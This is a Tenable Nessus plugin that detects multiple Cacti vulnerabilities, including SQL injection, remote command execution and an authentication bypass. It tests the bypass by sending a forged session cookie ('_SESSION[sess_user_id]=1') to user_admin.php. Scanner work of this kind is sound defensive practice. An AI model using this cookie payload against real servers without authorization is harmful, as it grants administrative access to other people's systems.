#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18619);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(14128, 14129, 14130);

  name["english"] = "Cacti < 0.8.6f Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running Cacti, a web-based frontend to RRDTool for
network graphing. 

The version of Cacti on the remote host suffers from several
vulnerabilities that may allow an attacker to bypass authentication
and gain administrative access to the affected application (if PHP's
'register_globals' setting is enabled), execute arbitrary commands
remotely, and conduct SQL injection attacks. 

See also : http://www.hardened-php.net/advisory-032005.php
           http://www.hardened-php.net/advisory-042005.php
           http://www.hardened-php.net/advisory-052005.php
Solution : Upgrade to Cacti 0.8.6f.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Cacti < 0.8.6f";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the authentication bypass flaw.
  req = http_get(item:string(dir, "/user_admin.php"), port:port);
  req = str_replace(
    string:req,
    find:"Accept:",
    replace:string(
      "Cookie: _SESSION[sess_user_id]=1;no_http_headers=1;\r\n",
      "Accept:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we get a link for adding users.
  if ('href="user_admin.php?action=user_edit">Add' >< res) {
    security_hole(port);
    exit(0);
  }
}
